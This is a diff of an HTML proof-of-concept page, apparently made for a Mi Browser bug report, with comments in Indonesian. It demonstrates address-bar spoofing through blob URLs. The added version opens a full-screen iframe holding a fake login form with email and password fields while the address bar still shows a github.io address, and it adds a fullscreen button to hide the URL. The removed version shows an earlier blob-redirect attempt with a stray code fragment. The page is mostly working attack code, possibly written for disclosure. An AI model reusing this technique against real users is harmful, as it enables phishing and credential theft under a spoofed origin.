@@ -1,35 +1,21 @@
 <!DOCTYPE html>
-<html>
-<head><meta name="viewport" content="width=device-width,initial-scale=1">
-<style>body{background:white;color:black;padding:20px;font-family:sans-serif}button{padding:16px;width:100%;background:blue;color:white;font-size:18px;border:0;border-radius:8px}#manual{margin-top:20px;display:none;padding:15px;background:red;color:white;text-align:center;font-weight:bold}</style>
-</head>
-<body>
-<h3>PoC COMBO FIX - Mi Browser</h3>
-<button id="btn">1. BUAT BLOB (KLIK INI DULU)</button>
-<a id="manual" href="#">2. KLIK DISINI UNTUK BUKA BLOB - INI BUG NYA</a>
-<div id="log" style="margin-top:15px;background:black;color:lime;padding:10px;word-break:break-all">Status: Siap</div>
-
+<html><head><meta name="viewport" content="width=device-width">
+<style>body{padding:20px;font-family:sans-serif} #cover{position:fixed;left:0;top:0;width:100%;height:100%;background:white;z-index:999;display:none} iframe{width:100%;height:100%;border:0}</style>
+</head><body>
+<h3>PoC FINAL - No Redirect</h3>
+<p>Address bar masih bonex1927.github.io = bug</p>
+<button onclick="serang()" style="width:100%;padding:20px;background:blue;color:white;font-size:18px;border:0;border-radius:10px">KLIK SERANG</button>
+<div id="log" style="background:black;color:lime;padding:10px;margin-top:10px"></div>
+<div id="cover"></div>
 <script>
-document.getElementById('btn').onclick = function(){
-  const fake = `<body style="background:white;color:black;padding:20px;font-family:sans-serif"><h1 style="color:red">INI ADALAH KONTEN DARI BLOB</h1><p>Alamat di address bar masih ada <b>bonex1927.github.io</b> padahal ini fake.</p><p>Ini bukti origin confusion.</p><button onclick="document.documentElement.requestFullscreen()" style="width:100%;padding:15px;background:black;color:white">3. FULLSCREEN (HILANGKAN URL)</button></body>`;
-  const blob = new Blob([fake], {type:'text/html'});
-  const url = URL.createObjectURL(blob);
-
-  const log = document.getElementById('log');
-  const link = document.getElementById('manual');
-  log.textContent = "URL Blob kebuat: " + url;
-  link.href = url;
-  link.style.display = "block";
-  link.textContent = "2. KLIK DISINI UNTUK BUKA BLOB -> " + url.substring(0,40)+"...";
-};
+function serang(){
+  let fake = `<h1 style=color:red>FAKE LOGIN - bonex1927.github.io</h1><p>Ini dari BLOB tapi URL masih github.io</p><input placeholder=email style=width:100%;padding:12px><br><br><input type=password placeholder=password style=width:100%;padding:12px><br><br><button style=width:100%;padding:12px;background:blue;color:white>LOGIN</button><br><br><button onclick=document.documentElement.requestFullscreen() style=width:100%;padding:15px;background:black;color:white>3. FULLSCREEN HIDE URL</button>`;
+  let blob = new Blob([fake], {type:'text/html'});
+  let url = URL.createObjectURL(blob);
+  document.getElementById('log').innerText = "Blob: "+url;
+  let cover = document.getElementById('cover');
+  cover.style.display='block';
+  cover.innerHTML = `<iframe src="${url}"></iframe>`;
+}
 </script>
-</body>
-</html>    setTimeout(()=>{ window.location.href = url; }, 100);
-
-  }catch(e){
-    log.textContent = "ERROR: " + e.message;
-  }
-};
-</script>
-</body>
-</html>
+</body></html>
